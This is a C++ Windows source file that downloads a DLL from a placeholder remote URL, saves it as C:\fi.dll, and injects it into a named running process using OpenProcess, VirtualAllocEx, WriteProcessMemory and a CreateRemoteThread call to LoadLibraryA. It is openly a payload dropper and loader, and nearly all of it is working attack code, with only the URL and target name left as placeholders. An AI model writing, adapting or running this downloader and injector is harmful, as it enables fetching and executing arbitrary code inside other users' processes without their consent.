#include <iostream>
#include <Windows.h>
#include <string>
#include "Shlwapi.h"
#include "process_actions.h"
#include "getlast_error.h"
#include <WinInet.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Wininet.lib")
#define _CRT_SECURE_NO_WARNINGS
using namespace std;

void GetPayload() {
	char* lpBuffer = NULL;
	DWORD numberOfBytesRead = 0;
	DWORD nnumberBytesWritten = 0;

	//Get a handle to the useragent (using mozilla as example)
	HINTERNET iOpen = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (iOpen == NULL) {
		std::cerr << "error could not open handle to user agent: " << GetLastErrorAsString();
	}
	else {
		//if using not relative url use InternetCanonicalizeUrl
		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "<url_path_to_remote_dll>", 0, 0, INTERNET_FLAG_RELOAD, 0);
		if (iOpen == NULL) {
			std::cerr << "could not access resource: " << GetLastErrorAsString();
		}
		else {
			//create the file 
			HANDLE hOut = CreateFile(L"C:\\fi.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hOut == INVALID_HANDLE_VALUE) {
				cerr << "could not create file: " << GetLastErrorAsString() << endl;
			}
			else {
				do {
					lpBuffer = new char[2000];
					ZeroMemory(lpBuffer, 2000);
						InternetReadFile(iRsrc, (LPVOID)lpBuffer, 2000, &numberOfBytesRead);
						WriteFile(hOut, &lpBuffer[0], numberOfBytesRead, &nnumberBytesWritten, NULL);
					delete[] lpBuffer;
					lpBuffer = NULL;
				} while (numberOfBytesRead);
				CloseHandle(hOut);
			}
			InternetCloseHandle(iOpen);
			InternetCloseHandle(iRsrc);
		}
	}
	return; 
}

int executePayload() {
	WIN32_FIND_DATAA fdata;
	HANDLE findFile = FindFirstFileA("C:\\fi.dll", &fdata);


	if (findFile == INVALID_HANDLE_VALUE) {
		cerr << "Could not find fild data" << GetLastErrorAsString();
		return -1;
	}
	else {
		std::string pname, dllpath;
		PROCESS_ACTIONS::ProcActions<DWORD> obj;

		const char* p = "<app_name_here>"; const char* d = "C:\\fi.dll";
		if (obj.getProcessIDbyName(p) == 0) {
			cerr << "[ERROR] The process specified was not found." << std::endl;
			return -1;
		}
		if (!PathFileExistsA(d)) {
			cerr << "\n[ERROR] Invalid file path specified." << endl;
			return -1;
		}
		else {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, obj.getProcessIDbyName(p));
			if (hProcess == NULL) {
				cerr << "Could not open process" << GetLastErrorAsString();
				return -1;
			}
			else {
				LPVOID dllP = VirtualAllocEx(hProcess, 0, strlen(d) + 1, MEM_COMMIT, PAGE_READWRITE);
				if (dllP == NULL) {
					cerr << "Failed to allocate memory in process. " << GetLastErrorAsString() << endl;
					return -1;
				}
				else {
					WriteProcessMemory(hProcess, dllP, (LPVOID)d, strlen(d) + 1, 0);
					HANDLE handleLthd = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), dllP, 0, 0);
					DWORD retVal = WaitForSingleObject(handleLthd, INFINITE);
					if (handleLthd == NULL | retVal == WAIT_FAILED) {
						cerr << "Failed to create remote thread in process." << endl;
						return -1;
					}
					printf("Path allocation address:  0x%08x\n", dllP);
					VirtualFreeEx(hProcess, dllP, strlen(d) + 1, MEM_RELEASE);
					return 0;
				}
			}
		}
	}
}


int main(int argc, char* argv[])
{
	GetPayload();
	executePayload();
	return 0;
}